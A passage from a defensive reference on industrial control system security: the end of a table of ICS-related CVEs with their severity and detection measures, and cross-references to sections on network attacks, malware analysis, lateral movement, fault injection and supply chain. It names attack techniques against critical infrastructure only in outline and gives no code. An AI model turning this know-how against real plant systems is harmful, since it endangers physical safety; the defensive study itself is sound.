| (no dedicated CVE) | OPC UA — MOUSEHOLE component | Reconnaissance and value writing via OPC UA | N/A | OPC UA client connections from unknown sources |
| **Stuxnet** | | | | |
| CVE-2010-2568 | Windows LNK | Autorun via crafted .LNK file — USB propagation | 9.3 Critical | Sysmon file creation monitoring; USB policy enforcement |
| CVE-2008-4250 (MS08-067) | Windows SMB | RCE via SMB — network propagation | 10.0 Critical | Network IDS; SMB protocol monitoring |
| **Additional** | | | | |
| CVE-2020-15791 | Siemens SIMATIC S7-300/S7-400 | CPU communication authentication bypass | 6.5 Medium | S7comm-plus encryption; network segmentation |
| CVE-2023-2611 | Advantech EKI | Command injection in web interface — gateway to OT network | 9.8 Critical | Web interface access control; WAF |
| CVE-2020-14511 | GE UR family relays | Buffer overflow in web interface — RCE on protection relay | 9.8 Critical | HTTP monitoring to relay management ports |

Detection methods reference the Suricata rules (section 10.2), Sigma rules (section 10.1), YARA rules (section 10.3), and monitoring approaches detailed in section 6. Patch management for ICS devices follows a different cadence than IT patching — ICS patches require vendor qualification, compatibility testing in a staging environment, and scheduled application during maintenance windows. Many of the CVEs above remain unpatched in field-deployed equipment years after disclosure, making compensating controls (network segmentation, protocol monitoring, access control) the primary mitigation.

---

## 14. Cross-references

**To Domain 9 (network security).** ICS protocols run over standard TCP/IP and Ethernet infrastructure. Network-level attacks (ARP spoofing, TCP session hijacking, DNS poisoning) described in Domain 9A apply directly to flat OT networks. TLS deployment in ICS protocols (Domain 16A §1.1–1.7) uses the same cryptographic stack described in Domain 9A §3. GOOSE spoofing (§2.3) is a Layer 2 attack analogous to ARP spoofing (Domain 9B §1).

**To Domain 11 (malware and tradecraft).** TRITON, INDUSTROYER, PIPEDREAM, and Stuxnet are sophisticated malware frameworks whose analysis requires the reverse engineering techniques from Domain 12 and the malware-analysis methodologies from Domain 11. DUSTTUNNEL (§3.4) is a C2 implant with architecture comparable to the C2 frameworks described in Domain 11A §5.

**To Domain 12 (reverse engineering).** PLC firmware reverse engineering (§4.3) uses the binary analysis techniques from Domain 12A (static analysis: disassembly, decompilation) and Domain 12B (firmware extraction and embedded RE). TriStation protocol reverse engineering (§1.2) required protocol RE comparable to the network protocol analysis in Domain 12A §7.

**To Domain 14 (AD and Windows enterprise).** OT environments that integrate with Active Directory for authentication inherit all AD attack surfaces (Domain 14A). Engineering workstation compromise (Domain 16A §2.5) follows the same lateral movement patterns (credential theft, Pass-the-Hash, Kerberoasting) described in Domain 14A. INDUSTROYER's main backdoor operated on Windows workstations using standard Windows C2 techniques.

**To Domain 17 (physical and hardware security).** S7-1500 firmware decryption (§4.3) required voltage-glitch fault injection (Domain 17B §2) and PCB-level analysis (Domain 17C §2). PLC hardware security (anti-tamper, secure boot) is covered in Domain 17D. Stuxnet's delivery via infected USB drives represents a physical-layer attack vector.

**To Domain 19 (supply chain security).** Havex (Domain 16A §3.4) was distributed via compromised ICS vendor websites — a supply-chain attack on the ICS ecosystem. PIPEDREAM's exploitation of the shared Codesys V3 runtime (§4.5) demonstrates how a single software supply chain component can create cross-vendor vulnerability. ICS firmware integrity and update authentication are supply chain security concerns parallel to those in Domain 19A.

**To Domain 27 (defensive architecture).** ICS network architecture (§5) implements the defense-in-depth and zero-trust principles described in Domain 27B, adapted to the constraints of operational technology (where "never trust, always verify" must be balanced against real-time control requirements and the limited computational capability of legacy PLCs and RTUs). ICS detection engineering (§6) complements the SIEM/EDR detection engineering in Domain 27C with ICS-protocol-specific monitoring, behavioral baselines derived from deterministic OT traffic patterns, and process-safety-aware alerting that distinguishes between cybersecurity events and operational anomalies.
